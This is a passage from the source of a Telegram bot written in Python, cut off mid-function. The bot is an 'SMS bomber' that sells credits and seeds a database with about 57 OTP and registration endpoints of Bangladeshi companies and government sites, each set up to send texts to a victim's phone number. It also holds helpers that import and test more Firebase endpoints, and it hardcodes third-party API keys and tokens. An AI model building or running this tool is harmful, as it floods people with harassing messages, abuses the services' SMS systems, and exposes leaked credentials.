# ===================== bot.py - COMPLETE A TO Z WITH COLOR THEMES =====================
import os
import asyncio
import logging
import aiosqlite
import aiohttp
import json
import random
import re
import hashlib
import signal
import sys
import gc
from datetime import datetime, timedelta
from collections import defaultdict
from telegram import Update, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ===================== CONFIGURATION =====================
BOT_TOKEN = ""
ADMIN_ID = 8811450472
ADMIN_USERNAME = "aerivue"
OWNER_USERNAME = "ShownOfficial"

# ===================== PRIVATE LOG CHANNEL =====================
# Put your private channel/group ID here (must start with -100)
# Bot must be admin in that channel with Post Messages permission
LOG_CHANNEL_ID = None  # e.g. -1001234567890

# ===================== BACKUP MANAGER =====================
# Separate private channel/group for automatic DB backups
BACKUP_CHANNEL_ID = None  # e.g. -1009876543210  (bot must be admin)
BACKUP_TASK = None  # runtime handle for the scheduler

DB_PATH = "bot_database.db"

# Global variables
SETTINGS = {}
SEND_APIS = []
BOMBER_APIS = []
SMS_API_URL = ""
SMS_API_KEY = ""
BOMBING_ACTIVE = True
BOMBING_TASKS = {}
RESTART_COUNT = 0
MAX_RESTARTS = 5
db_conn = None
DB_LOCK = asyncio.Lock()

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ===================== DATABASE =====================
async def get_db():
    global db_conn
    async with DB_LOCK:
        try:
            if db_conn is None:
                db_conn = await aiosqlite.connect(DB_PATH)
                db_conn.row_factory = aiosqlite.Row
                await db_conn.execute("PRAGMA journal_mode=WAL")
                await db_conn.execute("PRAGMA synchronous=NORMAL")
                await db_conn.execute("PRAGMA cache_size=10000")
                await db_conn.execute("PRAGMA temp_store=MEMORY")
            return db_conn
        except Exception as e:
            logger.error(f"Database connection error: {e}")
            db_conn = None
            raise

async def close_db():
    global db_conn
    async with DB_LOCK:
        if db_conn:
            try:
                await db_conn.close()
            except Exception as e:
                logger.error(f"Close DB error: {e}")
            db_conn = None

# ===================== DATABASE INITIALIZATION =====================
async def init_db():
    try:
        conn = await get_db()
        
        # Users table
        await conn.execute('''CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            balance INTEGER DEFAULT 0,
            total_sms INTEGER DEFAULT 0,
            total_bombing INTEGER DEFAULT 0,
            total_bulk INTEGER DEFAULT 0,
            join_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active',
            daily_bonus_date TIMESTAMP,
            is_premium INTEGER DEFAULT 0,
            premium_expiry TIMESTAMP,
            referral_code TEXT UNIQUE,
            total_referrals INTEGER DEFAULT 0,
            welcome_bonus_claimed INTEGER DEFAULT 0
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            amount INTEGER,
            usages INTEGER,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS redeem_history (
            user_id INTEGER,
            code TEXT,
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            PRIMARY KEY (user_id, code)
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS api_stats (
            api_name TEXT PRIMARY KEY,
            total_calls INTEGER DEFAULT 0,
            total_success INTEGER DEFAULT 0,
            total_failed INTEGER DEFAULT 0,
            last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS admin_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            admin_id INTEGER,
            action TEXT,
            target_id INTEGER,
            details TEXT,
            log_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS apis (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE,
            method TEXT DEFAULT 'POST',
            url TEXT,
            body TEXT,
            is_active INTEGER DEFAULT 1,
            api_type TEXT DEFAULT 'bomber',
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS bot_settings (
            setting_key TEXT PRIMARY KEY,
            setting_value TEXT,
            description TEXT,
            updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS api_inventory (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            api_name TEXT UNIQUE,
            total_credits INTEGER DEFAULT 0,
            used_credits INTEGER DEFAULT 0,
            remaining_credits INTEGER DEFAULT 0,
            last_updated TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            status TEXT DEFAULT 'active'
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS api_usage (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            api_name TEXT,
            user_id INTEGER,
            success INTEGER,
            usage_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS achievements (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            achievement_name TEXT,
            unlocked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(user_id, achievement_name)
        )''')
        
        await conn.execute('''CREATE TABLE IF NOT EXISTS referrals (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            referrer_id INTEGER,
            referred_id INTEGER,
            bonus_given INTEGER DEFAULT 0,
            referral_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # Welcome media manager table
        await conn.execute('''CREATE TABLE IF NOT EXISTS welcome_media (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            file_id TEXT NOT NULL,
            media_type TEXT NOT NULL,
            caption TEXT,
            is_active INTEGER DEFAULT 1,
            is_premium_only INTEGER DEFAULT 0,
            added_by INTEGER,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')

        # is_active column check
        cursor = await conn.execute("PRAGMA table_info(apis)")
        columns = await cursor.fetchall()
        column_names = [col[1] for col in columns]
        
        if 'is_active' not in column_names:
            await conn.execute("ALTER TABLE apis ADD COLUMN is_active INTEGER DEFAULT 1")

        # Default Settings
        default_settings = [
            ("daily_bonus_enabled", "true", "Daily bonus on/off"),
            ("daily_bonus_amount", "5", "Daily bonus amount"),
            ("daily_bonus_cooldown", "24", "Bonus cooldown"),
            ("sms_cost", "1", "Cost per SMS"),
            ("bomber_cost", "1", "Cost per bomber"),
            ("bulk_cost", "1", "Cost per bulk"),
            ("max_bulk_numbers", "50", "Max numbers in bulk"),
            ("bomber_max_per_api", "100", "Max per API in bomber"),
            ("phone_prefixes", "017,018,019,016,015,013,014,010", "Valid prefixes"),
            ("phone_length", "11", "Phone length"),
            ("premium_price", "100", "Premium price"),
            ("premium_duration", "30", "Premium duration"),
            ("referral_bonus", "10", "Referral bonus"),
            ("maintenance_mode", "false", "Maintenance mode"),
            ("premium_bonus", "10", "Premium daily bonus"),
            ("premium_sms_cost", "0.5", "Premium SMS cost"),
            ("api_call_interval", "0.05", "API call interval"),
            ("api_timeout", "15", "API timeout"),
            ("sms_api_url", "https://api.paglahost.shop/Custom_SMS/api.php", "SMS API URL"),
            ("sms_api_key", "Shuvo55356", "SMS API Key"),
            ("bulk_sms_interval", "0.03", "Bulk SMS interval"),
            ("welcome_bonus_amount", "10", "Welcome bonus amount"),
            ("max_bomber_amount", "200", "Max bomber amount"),
            ("parallel_requests", "5", "Parallel requests count"),
            ("welcome_message", "🔥 Welcome! Join our group to use the bot.", "Welcome message"),
            ("required_group", "", "Required group ID (empty = no check)"),
            ("welcome_media_enabled", "true", "Welcome media on/off"),
            ("welcome_media_mode", "random", "random or sequential"),
            ("backup_enabled", "false", "Auto backup on/off"),
            ("backup_interval_hours", "6", "Auto backup every N hours"),
            ("backup_formats", "sqlite,json", "Formats: sqlite,json"),
        ]
        
        for key, value, desc in default_settings:
            await conn.execute(
                "INSERT OR IGNORE INTO bot_settings (setting_key, setting_value, description) VALUES (?, ?, ?)",
                (key, value, desc)
            )

        # Default APIs (50+ bomber API)
        cursor = await conn.execute("SELECT COUNT(*) FROM apis")
        count = await cursor.fetchone()
        
        if count[0] == 0:
            default_apis = [
                ("Paperfly", "POST", "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", '{"full_name":"Apk","email_address":"apkzone2.0@gmail.com","company_name":"Ahgbd","phone_number":"{phone}"}', "bomber"),
                ("OsudPotro", "POST", "https://api.osudpotro.com/api/v1/users/send_otp", '{"mobile":"+880{phone}","deviceToken":"web","language":"en","os":"web"}', "bomber"),
                ("Bohubrihi", "POST", "https://bb-api.bohubrihi.com/public/activity/otp", '{"phone":"{phone}","intent":"login"}', "bomber"),
                ("Fundesh", "POST", "https://fundesh.com.bd/api/auth/generateOTP", '{"msisdn":"{phone}"}', "bomber"),
                ("Jatri", "POST", "https://user-api.jslglobal.co/v2/send-otp", '{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}', "bomber"),
                ("RedX", "POST", "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", '{"mobile":"+88{phone}"}', "bomber"),
                ("RabbitHoleBD", "POST", "https://apix.rabbitholebd.com/appv2/login/requestOTP", '{"mobile":"+88{phone}"}', "bomber"),
                ("Qcoom", "POST", "https://auth.qcoom.com/api/v1/otp/send", '{"mobileNumber":"+88{phone}"}', "bomber"),
                ("Training.gov.bd", "POST", "https://training.gov.bd/backoffice/api/user/sendOtp", '{"mobile":"{phone}"}', "bomber"),
                ("Easy.com.bd", "POST", "https://core.easy.com.bd/api/v1/registration", '{"name":"Tusar","email":"apkzone2.0info@gmail.com","mobile":"{phone}","password":"amitusar","password_confirmation":"amitusar","device_key":"b2c8ddd3be"}', "bomber"),
                ("Shikho", "POST", "https://api.shikho.com/auth/v2/send/sms", '{"phone":"{phone}"}', "bomber"),
                ("Toybox", "POST", "https://api.toybox.live/bdapps_handler.php", '{"phone":"{phone}"}', "bomber"),
                ("Daraz", "POST", "https://member.daraz.com.bd/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("ProthomAlo", "POST", "https://prod-api.viewlift.com/identity/otp/resend?site=prothomalo", '{"phone":"{phone}"}', "bomber"),
                ("Deeptoplay", "POST", "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web", '{"phone":"{phone}"}', "bomber"),
                ("Quizgiri", "POST", "https://developer.quizgiri.xyz/api/v2.0/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("Quiztime", "POST", "https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("Betonbook", "POST", "https://api.betonbook.com/api/v5/auth/otp/request", '{"phone":"{phone}"}', "bomber"),
                ("Applink", "POST", "https://applink.com.bd/appstore-v4-server/login/otp/request", '{"phone":"{phone}"}', "bomber"),
                ("RobiWeb", "POST", "https://webapi.robi.com.bd/v1/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("RobiRegister", "POST", "https://webapi.robi.com.bd/v1/account/register/otp", '{"phone":"{phone}"}', "bomber"),
                ("Softmax", "POST", "https://softmaxmanager.xyz/api/v1/user/request/otp/", '{"phone":"{phone}"}', "bomber"),
                ("Doctime", "POST", "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", '{"phone":"{phone}"}', "bomber"),
                ("Banglalink", "POST", "https://eshop-api.banglalink.net/api/v1/customer/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("Hishabee", "POST", "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}", '{"phone":"{phone}"}', "bomber"),
                ("Skitto", "POST", "https://www.skitto.com/replace-sim/sent-otp/phone", '{"phone":"{phone}"}', "bomber"),
                ("RobiDA", "POST", "https://da-api.robi.com.bd/da-nll/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Chardike", "POST", "https://api.chardike.com/api/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Apex4u", "POST", "https://api.apex4u.com/api/auth/login", '{"phone":"{phone}"}', "bomber"),
                ("HungryNaki", "POST", "https://api.hungrynaki.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("BDTickets", "POST", "https://api.bdtickets.com/api/v1/otp/request", '{"phone":"{phone}"}', "bomber"),
                ("Rokomari", "POST", "https://api.rokomari.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Pickaboo", "POST", "https://api.pickaboo.com/api/v1/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("Ajkerdeal", "POST", "https://api.ajkerdeal.com/api/v1/otp/generate", '{"phone":"{phone}"}', "bomber"),
                ("Chaldal", "POST", "https://api.chaldal.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Pathao", "POST", "https://api.pathao.com/api/v1/otp/request", '{"phone":"{phone}"}', "bomber"),
                ("BongoBD", "POST", "https://api.bongobd.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Toffee", "POST", "https://api.toffeelive.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Chorki", "POST", "https://api.chorki.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("VApp", "POST", "https://api.v-app.io/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Teletalk", "POST", "https://selfcare.teletalk.com.bd/api/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("10MS", "POST", "https://api.10minuteschool.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Shwapno", "POST", "https://api.shwapno.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Shohoz", "POST", "https://www.shohoz.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Sharetrip", "POST", "https://api.sharetrip.net/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Gozayaan", "POST", "https://api.gozayaan.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Evaly", "POST", "https://api.evaly.com.bd/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Bikroy", "POST", "https://bikroy.com/data/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Lajpharma", "POST", "https://lajpharma.com/api/send-otp", '{"phone":"{phone}"}', "bomber"),
                ("Steadfast", "POST", "https://steadfast.com.bd/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Cineplex", "POST", "https://api.cineplexbd.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Priyoshop", "POST", "https://api.priyoshop.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Minabazar", "POST", "https://api.minabazar.com.bd/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Labaid", "POST", "https://api.labaidgroup.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Praava", "POST", "https://api.praavahealth.com/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("PizzaHut", "POST", "https://pizzahut.com.bd/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("Foodpanda", "POST", "https://foodpanda.com.bd/api/v1/otp/send", '{"phone":"{phone}"}', "bomber"),
                ("ConvexSMS", "GET", "https://energized-parakeet-54.convex.site/api/sendsms", '{"key":"tneh_86ATANdvxjtClG1soWENHUL2zNXO1lAo","number":"+88{phone}","count":1}', "bomber"),
            ]
            for api in default_apis:
                await conn.execute(
                    "INSERT INTO apis (name, method, url, body, api_type, added_by) VALUES (?, ?, ?, ?, ?, ?)",
                    (api[0], api[1], api[2], api[3], api[4], ADMIN_ID)
                )

        await conn.commit()
        logger.info("✅ Database initialized")
        
        await load_settings()
        await load_apis()
        await load_sms_api()
        
        await cleanup_tasks()
        
    except Exception as e:
        logger.error(f"Database init error: {e}")
        raise

async def cleanup_tasks():
    global BOMBING_TASKS
    for user_id in list(BOMBING_TASKS.keys()):
        if user_id in BOMBING_TASKS:
            BOMBING_TASKS[user_id]['active'] = False
            await asyncio.sleep(0.5)
            if user_id in BOMBING_TASKS:
                del BOMBING_TASKS[user_id]

# ===================== SETTINGS =====================
async def load_settings():
    global SETTINGS
    try:
        conn = await get_db()
        cursor = await conn.execute("SELECT setting_key, setting_value FROM bot_settings")
        rows = await cursor.fetchall()
        SETTINGS = {row[0]: row[1] for row in rows}
        logger.info(f"✅ Loaded {len(SETTINGS)} settings")
    except Exception as e:
        logger.error(f"Settings load error: {e}")
        SETTINGS = {}

def get_setting(key, default=None):
    value = SETTINGS.get(key, default)
    return value if value is not None else default

async def update_setting(key, value):
    global SETTINGS
    try:
        conn = await get_db()
        await conn.execute(
            "UPDATE bot_settings SET setting_value = ?, updated_at = CURRENT_TIMESTAMP WHERE setting_key = ?",
            (value, key)
        )
        await conn.commit()
        SETTINGS[key] = value
        if key in ['sms_api_url', 'sms_api_key']:
            await load_sms_api()
        return True
    except Exception as e:
        logger.error(f"Update setting error: {e}")
        return False

async def load_sms_api():
    global SMS_API_URL, SMS_API_KEY
    SMS_API_URL = get_setting('sms_api_url', 'https://api.paglahost.shop/Custom_SMS/api.php')
    SMS_API_KEY = get_setting('sms_api_key', 'Shuvo55356')
    logger.info(f"✅ SMS API loaded")

# ===================== API LOADER =====================
async def load_apis():
    global SEND_APIS, BOMBER_APIS
    try:
        conn = await get_db()
        
        cursor = await conn.execute("SELECT name, method, url, body FROM apis WHERE is_active = 1 AND api_type = 'bomber'")
        rows = await cursor.fetchall()
        BOMBER_APIS = []
        seen = set()
        for row in rows:
            name = row[0]
            if name in seen:
                continue
            seen.add(name)
            try:
                body = json.loads(row[3]) if row[3] else {}
            except:
                body = {}
            BOMBER_APIS.append({
                "name": name,
                "method": row[1],
                "url": row[2],
                "body": body,
                "active": True
            })
        
        cursor = await conn.execute("SELECT name, method, url, body FROM apis WHERE is_active = 1 AND api_type = 'send'")
        rows = await cursor.fetchall()
        SEND_APIS = []
        seen = set()
        for row in rows:
            name = row[0]
            if name in seen:
                continue
            seen.add(name)
            try:
                body = json.loads(row[3]) if row[3] else {}
            except:
                body = {}
            SEND_APIS.append({
                "name": name,
                "method": row[1],
                "url": row[2],
                "body": body,
                "active": True
            })
        
        logger.info(f"✅ Loaded {len(BOMBER_APIS)} bomber APIs, {len(SEND_APIS)} send APIs")
    except Exception as e:
        logger.error(f"API load error: {e}")
        BOMBER_APIS = []
        SEND_APIS = []

# ===================== FIREBASE API MANAGER =====================
def is_firebase_url(url: str) -> bool:
    if not url:
        return False
    u = url.lower()
    keys = ["firebase", "firebasedynamiclinks", "identitytoolkit", "securetoken", "googleapis.com/identitytoolkit", "firebaseapp.com", "cloudfunctions.net"]
    return any(k in u for k in keys)

async def parse_firebase_lines(text: str):
    """Parse URLs from plain text / .txt content. One URL per line or space-separated."""
    urls = []
    for line in text.replace(",", "\n").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        # extract http(s) urls from line
        found = re.findall(r'https?://[^\s\'\"<>]+', line)
        if found:
            urls.extend(found)
        elif line.startswith("http"):
            urls.append(line)
    # unique preserve order
    seen = set()
    out = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out

async def add_firebase_urls(urls, admin_id):
    """Insert firebase URLs as bomber APIs. Returns (added, skipped, failed)."""
    conn = await get_db()
    added, skipped, failed = 0, 0, 0
    bodies = [
        '{"phone":"{phone}"}',
        '{"mobile":"{phone}"}',
        '{"phoneNumber":"+88{phone}"}',
        '{"msisdn":"{phone}"}',
    ]
    for i, url in enumerate(urls):
        try:
            host = url.replace("https://", "").replace("http://", "").split("/")[0].replace(".", "_")
            name = f"FB_{host[:24]}_{i}"
            cursor = await conn.execute("SELECT 1 FROM apis WHERE url = ? OR name = ?", (url, name))
            if await cursor.fetchone():
                skipped += 1
                continue
            body = bodies[i % len(bodies)]
            await conn.execute(
                "INSERT INTO apis (name, method, url, body, api_type, is_active, added_by) VALUES (?, ?, ?, ?, ?, 1, ?)",
                (name, "POST", url, body, "bomber", admin_id)
            )
            added += 1
        except Exception as e:
            logger.error(f"add firebase url error: {e}")
            failed += 1
    await conn.commit()
    await load_apis()
    return added, skipped, failed

async def test_firebase_api(url, method="POST", body=None, timeout=10):
    """Quick live test — returns True if looks alive."""
    test_phone = "01700000000"
    data = body or {"phone": test_phone}
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except Exception:
            data = {"phone": test_phone}
    data = replace_phone(data, test_phone)
    try:
        success, text, status = await safe_api_call(url, method=method, data=data, timeout=timeout)
        # Firebase often returns 400/401/403 but still "alive"
        if status in (200, 201, 202, 204, 400, 401, 403, 404, 429):
            return True, status, (text or "")[:120]
        if success:
            return True, status, (text or "")[:120]
        return False, status, (text or "")[:120]
    except Exception as e:
        return False, 0, str(e)[:120]

async def remove_dead_firebase(test_phone="01700000000"):
    """Test all firebase-like APIs; deactivate dead ones. Returns stats."""
    conn = await get_db()
    cursor = await conn.execute(
        "SELECT id, name, url, method, body FROM apis WHERE is_active = 1"
    )
    rows = await cursor.fetchall()
    dead_ids = []
    alive = 0
    checked = 0
    for row in rows:
        api_id, name, url, method, body = row
        if not is_firebase_url(url) and not (name or "").upper().startswith("FB_"):
            continue
        checked += 1
        ok, status, _ = await test_firebase_api(url, method or "POST", body)
        if ok:
            alive += 1
        else:
            dead_ids.append(api_id)
        await asyncio.sleep(0.15)
    for did in dead_ids:
        await conn.execute("UPDATE apis SET is_active = 0 WHERE id = ?", (did,))
    await conn.commit()
    await load_apis()
    return {"checked": checked, "alive": alive, "dead": len(dead_ids)}

async def keep_active_firebase_only():
    """Deactivate non-firebase bomber APIs? No — only remove inactive firebase already handled.
    This keeps only APIs that are active AND (firebase or FB_ named). Optional strict mode.
    Actually user asked: only active Firebase remain — deactivate dead firebase, leave others.
    Implemented in remove_dead_firebase. This helper deletes inactive firebase rows permanently."""
    conn = await get_db()
    cursor = await conn.execute("SELECT id, name, url FROM apis WHERE is_active = 0")
    rows = await cursor.fetchall()
    deleted = 0
    for row in rows:
        if is_firebase_url(row[2]) or (row[1] or "").upper().startswith("FB_"):
            await conn.execute("DELETE FROM apis WHERE id = ?", (row[0],))
            deleted += 1
    await conn.commit()
    await load_apis()
    return deleted

# ===================== SAFE API CALL =====================
async def safe_api_call(url, method='POST', data=None, params=None, timeout=15):
    max_retries = 2
    last_error = None
    
    for attempt in range(max_retries):
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Connection": "keep-alive"
            }
            
            async with aiohttp.ClientSession() as session:
                if method.upper() == 'POST':
                    async with session.post(url, json=data, headers=headers, timeout=timeout) as resp:
                        text = await resp.text()
                        return True, text, resp.status
                else:
                    async with session.get(url, params=params, headers=headers, timeout=timeout) as resp:
                        text = await resp.text()
                        return True, text, resp.status
                        
        except asyncio.TimeoutError:
            last_error = "Timeout"
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
            
        except aiohttp.ClientError as e:
            last_error = str(e)
            if attempt < max_retries - 1:
                await asyncio.sleep(1)
            
        except Exception as e:
            last_error = str(e)
            logger.error(f"API error: {e}")
            break
    
    return False, last_error or "All retries failed", 500

# ===================== SMS API =====================
async def send_sms_api(phone, message):
    global SMS_API_URL, SMS_API_KEY
    
    if not SMS_API_URL or not SMS_API_KEY:
        return False, "SMS API not configured!"
    
    try:
        params = {
            "key": SMS_API_KEY,
            "number": phone,
            "msg": message
        }
        
        success, text, status = await safe_api_call(
            SMS_API_URL, 
            method='GET',
            params=params,
            timeout=15
        )
        
        if not success:
            return False, f"API Error: {text}"
        
        success_keywords = ['success', 'sent', 'ok', 'true', '1', 'done', 'delivered', 'message', 'submitted']
        if any(word in text.lower() for word in success_keywords):
            return True, "Success"
        else:
            return False, f"API Response: {text[:100]}"
            
    except Exception as e:
        logger.error(f"SMS API Error: {e}")
        return False, str(e)

# ===================== API TRACKING =====================
async def track_api(api_name, success, user_id=0):
    try:
        conn = await get_db()
        if success:
            await conn.execute(
                """INSERT INTO api_stats (api_name, total_calls, total_success) 
                   VALUES (?, 1, 1) ON CONFLICT(api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, total_success = total_success + 1,
                   last_used = CURRENT_TIMESTAMP""",
                (api_name,)
            )
        else:
            await conn.execute(
                """INSERT INTO api_stats (api_name, total_calls, total_failed) 
                   VALUES (?, 1, 1) ON CONFLICT(api_name) DO UPDATE SET 
                   total_calls = total_calls + 1, total_failed = total_failed + 1,
                   last_used = CURRENT_TIMESTAMP""",
                (api_name,)
            )
        await conn.execute(
            "INSERT INTO api_usage (api_name, user_id, success) VALUES (?, ?, ?)",
            (api_name, user_id or 0, 1 if success else 0)
        )
        await conn.commit()
    except Exception as e:
        logger.error(f"Track API error: {e}")

async def admin_log(admin_id, action, target_id=None, details=""):
    try:
        conn = await get_db()
        await conn.execute(
            "INSERT INTO admin_logs (admin_id, action, target_id, details) VALUES (?, ?, ?, ?)",
            (admin_id, action, target_id, details)
        )
        await conn.commit()
    except Exception as e:
        logger.error(f"Admin log error: {e}")

# ===================== PRIVATE CHANNEL LOGGER =====================
async def log_to_channel(context, text: str):
    """Send every important event to the private log channel in quote format."""
    if not LOG_CHANNEL_ID:
        return
    try:
        quoted = f"<blockquote>{text}</blockquote>"
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=quoted,
            parse_mode="HTML",
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Log channel error: {e}")

async def log_user_action(context, user, action: str, details: str = ""):
    """Standard format for user actions."""
    username = f"@{user.username}" if user.username else "NoUsername"
    name = user.first_name or "Unknown"
    text = (
        f"👤 <b>User</b>: {name} ({username})\n"
        f"🆔 <b>ID</b>: <code>{user.id}</code>\n"
        f"📌 <b>Action</b>: {action}\n"
        f"🕐 <b>Time</b>: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    if details:
        text += f"📝 <b>Details</b>:\n{details}"
    await log_to_channel(context, text)

async def log_admin_action(context, admin, action: str, details: str = ""):
    """Log admin actions to private channel."""
    username = f"@{admin.username}" if admin.username else "NoUsername"
    name = admin.first_name or "Admin"
    text = (
        f"🛡️ <b>ADMIN</b>: {name} ({username})\n"
        f"🆔 <b>ID</b>: <code>{admin.id}</code>\n"
        f"📌 <b>Action</b>: {action}\n"
        f"🕐 <b>Time</b>: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
    )
    if details:
        text += f"📝 <b>Details</b>:\n{details}"
    await log_to_channel(context, text)

# ===================== QUOTE FORMAT HELPERS =====================
def to_quote(text: str) -> str:
    """Wrap any bot reply text in Telegram HTML blockquote."""
    if not text:
        return text
    # Avoid double-wrapping
    if text.strip().startswith("<blockquote>") and text.strip().endswith("</blockquote>"):
        return text
    # Escape basic HTML that could break if already present is left as-is;
    # we keep original markdown-style content inside the quote.
    return f"<blockquote>{text}</blockquote>"

async def qreply(update_or_msg, text: str, **kwargs):
    """Reply with forced quote format. Works with Update or Message."""
    kwargs["parse_mode"] = "HTML"
    quoted = to_quote(text)
    if hasattr(update_or_msg, "message") and update_or_msg.message:
        return await update_or_msg.message.reply_text(quoted, **kwargs)
    if hasattr(update_or_msg, "reply_text"):
        return await update_or_msg.reply_text(quoted, **kwargs)
    raise TypeError("qreply needs Update or Message")

async def qedit(msg, text: str, **kwargs):
    """Edit message with forced quote format."""
    kwargs["parse_mode"] = "HTML"
    return await msg.edit_text(to_quote(text), **kwargs)

# ===================== WELCOME MEDIA MANAGER =====================
async def get_welcome_media(user_id=None, is_premium=False):
    """Return one active welcome media (random or sequential). Supports photo/video/gif."""
    try:
        if get_setting("welcome_media_enabled", "true") != "true":
            return None
        conn = await get_db()
        if is_premium:
            cursor = await conn.execute(
                "SELECT id, file_id, media_type, caption FROM welcome_media WHERE is_active = 1 ORDER BY RANDOM() LIMIT 1"
            )
        else:
            cursor = await conn.execute(
                "SELECT id, file_id, media_type, caption FROM welcome_media WHERE is_active = 1 AND is_premium_only = 0 ORDER BY RANDOM() LIMIT 1"
            )
        row = await cursor.fetchone()
        if not row:
            return None
        return {"id": row[0], "file_id": row[1], "media_type": row[2], "caption": row[3]}
    except Exception as e:
        logger.error(f"get_welcome_media error: {e}")
        return None

async def send_welcome_media(update, context, caption_text=None, is_premium=False):
    """Send welcome media (photo / video / animation) then text if needed."""
    media = await get_welcome_media(update.effective_user.id, is_premium=is_premium)
    if not media:
        return False
    try:
        chat_id = update.effective_chat.id
        file_id = media["file_id"]
        mtype = (media["media_type"] or "photo").lower()
        caption = caption_text or media.get("caption") or ""
        # Keep caption inside quote style
        if caption and not caption.strip().startswith("<blockquote>"):
            caption = f"<blockquote>{caption}</blockquote>"
        kwargs = {"chat_id": chat_id, "parse_mode": "HTML"}
        if caption:
            kwargs["caption"] = caption
        if mtype in ("photo", "image"):
            await context.bot.send_photo(photo=file_id, **kwargs)
        elif mtype in ("video",):
            await context.bot.send_video(video=file_id, **kwargs)
        elif mtype in ("animation", "gif"):
            await context.bot.send_animation(animation=file_id, **kwargs)
        else:
            await context.bot.send_document(document=file_id, **kwargs)
        return True
    except Exception as e:
        logger.error(f"send_welcome_media error: {e}")
        return False

async def list_welcome_media():
    try:
        conn = await get_db()
        cursor = await conn.execute(
            "SELECT id, media_type, is_active, is_premium_only, caption, added_at FROM welcome_media ORDER BY id DESC"
        )
